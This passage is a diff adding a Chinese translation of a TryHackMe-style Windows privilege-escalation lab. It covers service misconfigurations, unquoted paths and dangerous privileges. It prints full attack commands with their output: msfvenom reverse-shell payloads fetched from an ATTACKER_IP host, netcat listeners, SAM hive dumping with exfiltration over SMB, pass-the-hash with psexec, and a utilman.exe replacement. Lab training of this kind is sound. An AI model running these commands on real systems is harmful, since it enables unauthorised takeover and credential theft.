.\svcuser1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以看到，易受攻击的软件安装的服务以 svcuser1 的身份运行，与该服务关联的可执行文件位于“C:\Progra<del>2\System</del>1\WService.exe”中。然后我们继续检查可执行文件的权限：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)</span><br><span class="line">                                  NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                  BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                  BUILTIN\Users:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里有一些有趣的东西。Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以用我们喜欢的任何有效负载简单地覆盖它，服务将使用配置的用户帐户的权限执行它。</p>
+<p>让我们使用 msfvenom 生成一个 exe 服务有效负载并通过 python web 服务器提供服务：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后我们可以使用以下命令从 Powershell 中提取有效负载：</p>
+<p>Powershell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦有效载荷进入 Windows 服务器，我们将继续用我们的有效载荷替换服务可执行文件。由于我们需要另一个用户来执行我们的有效载荷，因此我们也希望向 Everyone 组授予完全权限：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们在攻击者的机器上启动一个反向监听器：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4445</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配权限自行重新启动服务以节省一些时间。从 cmd.exe 命令提示符中使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc stop windowsscheduler</span><br><span class="line">C:\&gt; sc start windowsscheduler</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong> PowerShell 有 <code>sc</code> 作为 <code>Set-Content</code> 的别名，因此您需要使用 <code>sc.exe</code> 才能以这种方式使用 PowerShell 控制服务。</p>
+<p>因此，您将获得具有 svcusr1 权限的反向 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4445</span><br><span class="line">Listening on 0.0.0.0 4445</span><br><span class="line">Connection received on 10.10.175.90 50649</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\svcusr1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>前往 svcusr1 桌面获取一个标志。不要忘记在本任务结束时输入该标志。</p>
+<h2 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h2><p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会使用一个相当模糊的功能强制服务运行任意可执行文件。</p>
+<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会发生一种非常特殊的行为。未加引号的意思是，相关可执行文件的路径没有正确加引号以考虑命令中的空格。</p>
+<p>作为示例，让我们看看两个服务之间的区别（这些服务仅用作示例，可能不适用于您的计算机）。第一个服务将使用正确的引号，以便 SCM 毫无疑问地知道它必须执行“C:\Program Files\RealVNC\VNC Server\vncserver.exe”指向的二进制文件，后跟给定的参数：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc qc "vncserver"</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: vncserver</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : VNC Server</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>请记住：PowerShell 的“sc”是“Set-Content”的别名，因此如果您在 PowerShell 提示符中，则需要使用“sc.exe”来控制服务。</strong></p>
+<p>现在让我们看看另一个没有正确引号的服务：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc qc "disk sorter enterprise"</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: disk sorter enterprise</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Disk Sorter Enterprise</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcusr2</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称中有空格，因此命令变得含糊不清，并且 SCM 不知道您尝试执行以下哪一项：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Command</td>
+<td>Argument 1</td>
+<td>Argument 2</td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk.exe</td>
+<td>Sorter</td>
+<td>Enterprise\bin\disksrs.exe</td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter.exe</td>
+<td>Enterprise\bin\disksrs.exe</td>
+<td></td>
+</tr>
+<tr>
+<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，除非空格是带引号的字符串的一部分，否则空格将用作参数分隔符。这意味着未带引号的命令的“正确”解释是执行“C:\MyPrograms\Disk.exe”并将其余部分作为参数。</p>
+<p>SCM 并没有像它应该的那样失败，而是尝试帮助用户并开始按照表中显示的顺序搜索每个二进制文件：</p>
+<ol>
+<li>首先，搜索“C:\MyPrograms\Disk.exe”。如果存在，服务将运行此可执行文件。</li>
+<li>如果后者不存在，它将搜索“C:\MyPrograms\Disk Sorter.exe”。如果存在，服务将运行此可执行文件。</li>
+<li>如果后者不存在，它将搜索“C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe”。此选项预计会成功，并且通常会在默认安装中运行。</li>
+</ol>
+<p>从这种行为可以看出问题。如果攻击者创建在预期服务可执行文件之前搜索的任何可执行文件，他们可以强制服务运行任意可执行文件。</p>
+<p>虽然这听起来微不足道，但大多数服务可执行文件默认安装在<code>C:\Program Files</code>或<code>C:\Program Files (x86)</code>下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则有例外：- 某些安装程序会更改已安装文件夹的权限，使服务易受攻击。- 管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全世界可写的，则可以利用该漏洞。</p>
+<p>在我们的案例中，管理员将磁盘排序器二进制文件安装在<code>c:\MyPrograms</code>下。默认情况下，这将继承<code>C:\</code>目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用“icacls”检查这一点：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt;icacls c:\MyPrograms</span><br><span class="line">c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Users:(I)(OI)(CI)(RX)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(AD)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(WD)</span><br><span class="line">              CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>BUILTIN\\Users</code> 组具有 <strong>AD</strong> 和 <strong>WD</strong> 权限，分别允许用户创建子目录和文件。</p>
+<p>使用 msfvenom 创建 exe-service payload 并将其传输到目标主机的过程与之前相同，因此请随意创建以下 payload 并将其像之前一样上传到服务器。我们还将启动一个监听器，以便在执行时接收反向 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4446</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦有效载荷进入服务器，就将其移动到可能发生劫持的任何位置。在本例中，我们将把有效载荷移动到“C:\MyPrograms\Disk.exe”。我们还将授予每个人对该文件的完整权限，以确保它可以由服务执行：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦服务重新启动，您的有效负载应该执行：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc stop "disk sorter enterprise"</span><br><span class="line">C:\&gt; sc start "disk sorter enterprise"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>结果，你将获得具有 svcusr2 权限的反向 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4446</span><br><span class="line">Listening on 0.0.0.0 4446</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\svcusr2</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Insecure-Service-Permissions"><a href="#Insecure-Service-Permissions" class="headerlink" title="Insecure Service Permissions"></a>Insecure Service Permissions</h2><p>如果服务的可执行 DACL 配置正确，并且服务的二进制路径正确引用，您仍有可能利用该服务。如果服务 DACL（而不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
+<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。为方便起见，可在 <code>C:\\tools</code> 处获取副本。检查 thmservice 服务 DACL 的命令是：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里我们可以看到 <code>BUILTIN\\Users</code> 组具有 SERVICE_ALL_ACCESS 权限，这意味着任何用户都可以重新配置该服务。</p>
+<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的机器上为其启动一个监听器：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4447</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，我们将反向 shell 可执行文件传输到目标机器并将其存储在“C:\Users\thm-unpriv\rev-svc3.exe”中。请随意使用 wget 传输您的可执行文件并将其移动到所需位置。请记住授予每个人执行您的有效负载的权限：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后的空格）：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem</span><br></pre></td></tr></tbody></table></figure>
+
+<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高权限帐户。要触发我们的有效载荷，剩下的就是重新启动服务：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们将在攻击者的机器上收到一个具有 SYSTEM 权限的 shell：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4447</span><br><span class="line">Listening on 0.0.0.0 4447</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Abusing-dangerous-privileges"><a href="#Abusing-dangerous-privileges" class="headerlink" title="Abusing dangerous privileges"></a>Abusing dangerous privileges</h1><h2 id="Windows-Privileges"><a href="#Windows-Privileges" class="headerlink" title="Windows Privileges"></a>Windows Privileges</h2><p>特权是帐户执行特定系统相关任务的权利。这些任务可以简单到关闭机器的特权，也可以简单到绕过某些基于 DACL 的访问控制的特权。</p>
+<p>每个用户都有一组分配的特权，可以使用以下命令检查：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Windows 系统上可用权限的完整列表可在此处找到。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才是值得关注的。您可以在 <a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p>
+<p>虽然我们不会逐一介绍，但我们将展示如何滥用您能找到的一些最常见的权限。</p>
+<h2 id="SeBackup-x2F-SeRestore"><a href="#SeBackup-x2F-SeRestore" class="headerlink" title="SeBackup / SeRestore"></a>SeBackup / SeRestore</h2><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何现有的 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
+<p>有了这种权力，攻击者可以使用许多技术轻松提升系统权限。我们将研究的一种技术包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p>
+<p>此帐户属于“备份操作员”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获取提升的控制台：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png" alt="Run as admin"></p>
+<p>一旦进入命令提示符，我们可以使用以下命令检查我们的权限：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Disabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></tbody></table></figure>
+
+<p>要备份 SAM 和 SYSTEM 哈希，我们可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将创建几个包含注册表配置单元内容的文件。我们现在可以使用 SMB 或任何其他可用方法将这些文件复制到我们的攻击者机器上。对于 SMB，我们可以使用 impacket 的“smbserver.py”在 AttackBox 的当前目录中启动一个具有网络共享的简单 SMB 服务器：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ mkdir share</span><br><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将创建一个名为“public”的共享，指向“share”目录，这需要我们当前 Windows 会话的用户名和密码。此后，我们可以在 Windows 机器中使用“copy”命令将两个文件传输到我们的 AttackBox：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></tbody></table></figure>
+
+<p>并使用 impacket 检索用户的密码哈希值：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们最终可以使用管理员的哈希执行传递哈希攻击，并以 SYSTEM 权限访问目标机器：</p>
+<p>KaliLinux</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP</span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 10.10.175.90.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file nfhtabqO.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.175.90.....</span><br><span class="line">[*] Creating service RoLE on 10.10.175.90.....</span><br><span class="line">[*] Starting service RoLE.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h2><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 身份运行的服务并获取该服务可执行文件的所有权。但是，对于此任务，我们将采取不同的方法。</p>
+<p>要获取 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。系统将要求我们输入密码以获取提升的控制台：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png" alt="Run as admin"></p>
+<p>一旦进入命令提示符，我们可以使用以下命令检查我们的权限：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这次我们将滥用“utilman.exe”来提升权限。Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png" alt="utilman normal behaviour"></p>
+<p>由于 Utilman 以 SYSTEM 权限运行，如果我们用任何我们喜欢的有效载荷替换原始二进制文件，我们将有效地获得 SYSTEM 权限。由于我们可以获得任何文件的所有权，因此替换它很简单。</p>
+<p>要替换 utilman，我们将首先使用以下命令获得它的所有权：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".</span><br></pre></td></tr></tbody></table></figure>
+
+<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要授予用户对 utilman.exe 的完全权限，您可以使用以下命令：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line">processed file: Utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
+<p>命令提示符</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Windows\System32\&gt; copy cmd.exe utilman.exe</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了触发 utilman，我们将从开始按钮锁定屏幕：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png" alt="lock screen"></p>
+<p>最后，继续单击“轻松访问”按钮，它将以 SYSTEM 权限运行 utilman.exe。由于我们用 cmd.exe 副本替换了它，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png" alt="utilman shell"></p>
+<h2 id="SeImpersonate-x2F-SeAssignPrimaryToken"><a href="#SeImpersonate-x2F-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate / SeAssignPrimaryToken"></a>SeImpersonate / SeAssignPrimaryToken</h2><p>这些权限允许进程模拟其他用户并代表他们行事。模拟通常包括能够在另一个用户的安全上下文中生成进程或线程。</p>
+<p>当您考虑 FTP 服务器的工作原理时，模拟很容易理解。FTP 服务器必须限制用户仅访问他们应该被允许查看的文件。</p>
+<p>假设我们有一个由用户“ftp”运行的 FTP 服务。如果没有模拟，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png" alt="img"></p>
+<p>有几个原因说明为什么使用 ftp 的令牌并不是最好的主意： - 为了正确提供文件，它们需要可供 <code>ftp</code> 用户访问。在上面的例子中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户 <code>ftp</code>。这增加了复杂性，因为我们必须为每个提供的文件/目录手动配置特定权限。 - 对于操作系统，所有文件都由用户 <code>ftp</code> 访问，与当前登录到 FTP 服务的用户无关。这使得将授权委托给操作系统变得不可能；因此，FTP 服务必须实现它。 - 如果 FTP 服务在某个时候受到威胁，攻击者将立即获得 <code>ftp</code> 用户可以访问的所有文件夹的访问权限。</p>
+<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，那么所有这些都会稍微简化一些，因为 FTP 服务可以暂时获取登录用户的访问令牌，并使用它来代表他们执行任何任务：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png" alt="img"></p>
+<p>现在，如果用户 Ann 登录到 FTP 服务，并且假定 ftp 用户具有模拟权限，则可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件就不需要以任何方式向用户 <code>ftp</code> 提供访问权限，操作系统会处理授权。由于 FTP 服务正在模拟 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
+<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟任何连接和验证该进程的用户。</p>
+<p>在 Windows 系统中，您会发现本地服务和网络服务帐户已经具有此类权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
+<p>要使用此类帐户提升权限，攻击者需要执行以下操作：1. 生成一个进程，以便用户可以连接并对其进行身份验证，从而进行模拟。2. 找到一种方法来强制特权用户连接并验证生成的恶意进程。</p>
+<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
